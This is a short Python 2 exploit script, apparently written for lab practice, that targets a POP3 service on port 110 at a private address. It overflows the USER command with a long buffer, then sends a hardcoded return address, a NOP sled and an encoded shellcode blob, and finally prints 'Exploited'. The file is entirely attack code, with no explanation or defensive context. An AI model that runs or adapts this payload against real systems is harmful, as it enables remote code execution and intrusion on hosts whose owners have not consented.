#!/usr/bin/python2

import socket
import sys

host = "192.168.70.137"
port = 110

crash = "A" * 5093 
return_address = "\x23\x49\xa1\x0f" # 0x0f9e24f9 
nops_sled = "\x90" * 20
shellcode = ( 
"\xdd\xc5\xd9\x74\x24\xf4\xbd\xb5\xa4\x0f\xe4\x5a\x29\xc9"
"\xb1\x52\x31\x6a\x17\x83\xc2\x04\x03\xdf\xb7\xed\x11\xe3"
"\x50\x73\xd9\x1b\xa1\x14\x53\xfe\x90\x14\x07\x8b\x83\xa4"
"\x43\xd9\x2f\x4e\x01\xc9\xa4\x22\x8e\xfe\x0d\x88\xe8\x31"
"\x8d\xa1\xc9\x50\x0d\xb8\x1d\xb2\x2c\x73\x50\xb3\x69\x6e"
"\x99\xe1\x22\xe4\x0c\x15\x46\xb0\x8c\x9e\x14\x54\x95\x43"
"\xec\x57\xb4\xd2\x66\x0e\x16\xd5\xab\x3a\x1f\xcd\xa8\x07"
"\xe9\x66\x1a\xf3\xe8\xae\x52\xfc\x47\x8f\x5a\x0f\x99\xc8"
"\x5d\xf0\xec\x20\x9e\x8d\xf6\xf7\xdc\x49\x72\xe3\x47\x19"
"\x24\xcf\x76\xce\xb3\x84\x75\xbb\xb0\xc2\x99\x3a\x14\x79"
"\xa5\xb7\x9b\xad\x2f\x83\xbf\x69\x6b\x57\xa1\x28\xd1\x36"
"\xde\x2a\xba\xe7\x7a\x21\x57\xf3\xf6\x68\x30\x30\x3b\x92"
"\xc0\x5e\x4c\xe1\xf2\xc1\xe6\x6d\xbf\x8a\x20\x6a\xc0\xa0"
"\x95\xe4\x3f\x4b\xe6\x2d\x84\x1f\xb6\x45\x2d\x20\x5d\x95"
"\xd2\xf5\xf2\xc5\x7c\xa6\xb2\xb5\x3c\x16\x5b\xdf\xb2\x49"
"\x7b\xe0\x18\xe2\x16\x1b\xcb\xcd\x4f\x65\x81\xa6\x8d\x69"
"\x84\x6a\x1b\x8f\xcc\x82\x4d\x18\x79\x3a\xd4\xd2\x18\xc3"
"\xc2\x9f\x1b\x4f\xe1\x60\xd5\xb8\x8c\x72\x82\x48\xdb\x28"
"\x05\x56\xf1\x44\xc9\xc5\x9e\x94\x84\xf5\x08\xc3\xc1\xc8"
"\x40\x81\xff\x73\xfb\xb7\xfd\xe2\xc4\x73\xda\xd6\xcb\x7a"
"\xaf\x63\xe8\x6c\x69\x6b\xb4\xd8\x25\x3a\x62\xb6\x83\x94"
"\xc4\x60\x5a\x4a\x8f\xe4\x1b\xa0\x10\x72\x24\xed\xe6\x9a"
"\x95\x58\xbf\xa5\x1a\x0d\x37\xde\x46\xad\xb8\x35\xc3\xcd"
"\x5a\x9f\x3e\x66\xc3\x4a\x83\xeb\xf4\xa1\xc0\x15\x77\x43"
"\xb9\xe1\x67\x26\xbc\xae\x2f\xdb\xcc\xbf\xc5\xdb\x63\xbf"
"\xcf"
)
padding = "C" * 2000
payload = crash + return_address + nops_sled + shellcode + padding

try:
	s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
	s.connect((host,port))
	s.recv(1024)
	s.send("USER " + payload + "\r\n")
	s.recv(1024)
	s.send("QUIT\r\n")
	print("[+] Sending Payloads")
	print("[+] Exploited")
	s.close()
		
except:
	print("Host is Unreachable")
	sys.exit()
